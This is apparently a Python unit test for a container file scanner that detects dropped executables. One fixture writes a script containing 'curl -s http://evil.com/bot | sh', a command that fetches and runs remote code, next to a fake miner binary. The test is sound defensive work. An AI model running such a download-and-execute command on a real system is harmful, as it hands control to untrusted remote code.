"""Unit tests for client/file_guard.py"""

import os
import stat
import tempfile
import unittest
from pathlib import Path

from client import file_guard


class TestFileGuard(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.proc_root = Path(self.temp_dir.name) / "proc"
        self.proc_root.mkdir(parents=True, exist_ok=True)

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_invalid_pid(self):
        res = file_guard.scan_container_sensitive_drops(0)
        self.assertEqual(res, [])
        res = file_guard.scan_container_sensitive_drops(1)
        self.assertEqual(res, [])

    def test_scan_detects_elf_and_exec_scripts(self):
        pid = 9999
        root_dir = self.proc_root / str(pid) / "root"
        tmp_dir = root_dir / "tmp"
        shm_dir = root_dir / "dev" / "shm"
        tmp_dir.mkdir(parents=True, exist_ok=True)
        shm_dir.mkdir(parents=True, exist_ok=True)

        # 1. ELF binary in /tmp
        elf_file = tmp_dir / "xmrig_miner"
        elf_file.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 100)
        os.chmod(str(elf_file), 0o755)

        # 2. Executable script in /dev/shm
        sh_file = shm_dir / "dropper.sh"
        sh_file.write_bytes(b"#!/bin/bash\ncurl -s http://evil.com/bot | sh\n")
        os.chmod(str(sh_file), 0o755)

        # 3. Regular non-executable text file in /tmp (should NOT be detected)
        normal_file = tmp_dir / "normal.txt"
        normal_file.write_bytes(b"some ordinary text")
        os.chmod(str(normal_file), 0o644)

        results = file_guard.scan_container_sensitive_drops(pid, proc_root=str(self.proc_root))

        # Check detected files
        detected_names = {r["filename"] for r in results}
        self.assertIn("xmrig_miner", detected_names)
        self.assertIn("dropper.sh", detected_names)
        self.assertNotIn("normal.txt", detected_names)

        # Check metadata
        elf_res = next(r for r in results if r["filename"] == "xmrig_miner")
        self.assertTrue(elf_res["is_elf"])
        self.assertEqual(elf_res["threat_score"], 90)
        self.assertTrue(bool(elf_res["sha256"]))


if __name__ == "__main__":
    unittest.main()

